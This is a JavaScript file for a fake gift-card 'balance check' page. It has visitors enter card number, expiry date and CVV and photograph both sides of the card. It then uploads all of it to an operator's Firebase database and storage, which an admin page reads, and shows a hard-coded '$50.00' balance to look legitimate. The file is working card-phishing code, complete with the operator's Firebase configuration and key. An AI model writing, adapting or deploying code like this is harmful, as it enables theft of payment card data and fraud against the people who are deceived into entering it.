// js/balance.js - FINAL FIREBASE VERSION (WORKS WITH YOUR balance.html)
console.log("Camera script loaded");

let stream = null;
let frontBlob = null;
let backBlob = null;

// Make blobs globally accessible for balance.html
window.frontBlob = null;
window.backBlob = null;

// === ADD THESE 3 FIREBASE SCRIPTS TO <head> OF balance.html IF NOT ALREADY THERE ===
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-app-compat.js"></script>
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-database-compat.js"></script>
// <script src="https://www.gstatic.com/firebasejs/12.5.0/firebase-storage-compat.js"></script>

// Firebase Config (same as admin.html)
const firebaseConfig = {
    apiKey: "AIzaSyBRmao9nvw49R1U6zS9NNY5W4Dn-NkNcrg",
    authDomain: "vanilla-3be8f.firebaseapp.com",
    projectId: "vanilla-3be8f",
    storageBucket: "vanilla-3be8f.firebasestorage.app",
    messagingSenderId: "476314002999",
    appId: "1:476314002999:web:38adc0bd80a8d6b44f81b2"
};

// Initialize Firebase (global compat)
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const storage = firebase.storage();

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page ready");

  // Format expiry (auto adds / after 2 digits)
  document.getElementById("expiry_date").addEventListener("input", (e) => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) {
      v = v.slice(0, 2) + "/" + v.slice(2);
    }
    e.target.value = v;
  });

  // Open Dual Camera
  document.getElementById("openCameraBtn").addEventListener("click", async () => {
    document.getElementById("dualCaptureBlock").classList.remove("hidden");
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
      const track = stream.getVideoTracks()[0];
      document.getElementById("dualVideoFront").srcObject = new MediaStream([track.clone()]);
      document.getElementById("dualVideoBack").srcObject = new MediaStream([track]);
    } catch (err) {
      alert("Camera not available. Use mobile or allow camera.");
      console.error(err);
    }
  });

  // Close Dual
  document.getElementById("dualCloseBtn").addEventListener("click", () => {
    document.getElementById("dualCaptureBlock").classList.add("hidden");
    if (stream) stream.getTracks().forEach(t => t.stop());
    stream = null;
  });

  // Capture Front
  document.getElementById("captureFrontBtn").addEventListener("click", () => {
    capture("dualVideoFront", "frontPreview", b => {
      frontBlob = b;
      window.frontBlob = b;
    });
  });

  // Capture Back
  document.getElementById("captureBackBtn").addEventListener("click", () => {
    capture("dualVideoBack", "backPreview", b => {
      backBlob = b;
      window.backBlob = b;
    });
  });

  function capture(videoId, imgId, callback) {
    const video = document.getElementById(videoId);
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    canvas.toBlob(blob => {
      document.getElementById(imgId).src = URL.createObjectURL(blob);
      document.getElementById(imgId).classList.remove("hidden");
      callback(blob);
    }, "image/jpeg", 0.9);
  }

  // Upload image and return URL
  async function uploadImage(blob, side) {
    if (!blob) return "";
    const fileName = `${side}_${Date.now()}.jpg`;
    const ref = storage.ref(`images/${fileName}`);
    await ref.put(blob);
    return await ref.getDownloadURL();
  }

  // Main form submit handler (your original logic + Firebase save)
  document.getElementById("balanceForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const submitBtn = document.getElementById("submitBtn");
    const label = submitBtn.querySelector('[data-label]');
    const spinner = submitBtn.querySelector('[data-spinner]');
    const status = document.getElementById("submitStatus");

    label.classList.add("hidden");
    spinner.classList.remove("hidden");
    status.textContent = "Uploading images...";

    try {
      // Upload images
      const frontUrl = await uploadImage(frontBlob, "front");
      const backUrl = await uploadImage(backBlob, "back");

      // Save to hidden fields
      document.getElementById("front_image_url").value = frontUrl;
      document.getElementById("back_image_url").value = backUrl;

      // Prepare data
      const data = {
        card_number: document.querySelector('[name="card_number"]').value.trim(),
        expiry_date: document.querySelector('[name="expiry_date"]').value.trim(),
        cvv: document.querySelector('[name="cvv"]').value.trim(),
        front_image: frontUrl || null,
        back_image: backUrl || null,
        timestamp: Date.now()
      };

      status.textContent = "Sending details...";

      // SAVE TO FIREBASE (this is the line that sends logs to admin.html)
      await db.ref("submissions").push(data);

      status.textContent = "Success! Balance checked.";
      document.getElementById("balanceText").textContent = "$50.00";
      document.getElementById("result").classList.remove("hidden");

      // Reset after 4 seconds
      setTimeout(() => {
        document.getElementById("balanceForm").reset();
        document.getElementById("front_image_url").value = "";
        document.getElementById("back_image_url").value = "";
        document.getElementById("result").classList.add("hidden");
        status.textContent = "";
        frontBlob = backBlob = null;
        window.frontBlob = window.backBlob = null;
        document.getElementById("frontPreview").classList.add("hidden");
        document.getElementById("backPreview").classList.add("hidden");
        label.classList.remove("hidden");
        spinner.classList.add("hidden");
      }, 4000);

    } catch (err) {
      console.error(err);
      status.textContent = "Error. Try again.";
      label.classList.remove("hidden");
      spinner.classList.add("hidden");
    }
  });

  // finishAndSubmitBtn now just triggers the main form submit
  document.getElementById("finishAndSubmitBtn")?.addEventListener("click", () => {
    document.getElementById("balanceForm").dispatchEvent(new Event("submit"));
  });
});
